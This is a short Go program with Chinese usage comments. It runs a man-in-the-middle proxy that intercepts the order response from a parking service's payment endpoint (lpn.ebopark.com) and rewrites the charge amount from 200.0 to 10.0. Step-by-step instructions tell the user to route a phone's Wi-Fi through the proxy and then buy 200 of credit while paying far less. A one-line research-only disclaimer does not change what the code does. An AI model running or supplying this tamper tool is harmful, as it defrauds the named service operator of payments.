/*
使用说明：
1、安装go。brew install golang
2、安装依赖包。go get github.com/elazarl/goproxy
3、运行此文件代码。go run eb_proxy.go
4、设置手机 wifi 代理服务器为本机 IP，端口 8848
5、应用中充值 200 支付及可。

声明：本代码只供技术研究与学习，请勿用于非法用途。
*/

package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"bytes"
	"strings"

	"github.com/elazarl/goproxy"
)

func main() {
	proxy := goproxy.NewProxyHttpServer()
	proxy.Verbose = false
	proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
		log.Println("====> URL:", ctx.Req.URL)
		if (ctx.Req.URL.Host == "lpn.ebopark.com") && (ctx.Req.URL.Path == "/orders/getChargeOrderNo") {
			body, _ := ioutil.ReadAll(resp.Body)
			bodyString := strings.Replace(string(body), ":200.0,", ":10.0,", 1)
			resp.Body = ioutil.NopCloser(bytes.NewBufferString(bodyString))
			resp.ContentLength = int64(len(bodyString))
			log.Println("====> Body:", bodyString)
		}
		return resp
	})
	http.ListenAndServe(":8848", proxy)
}
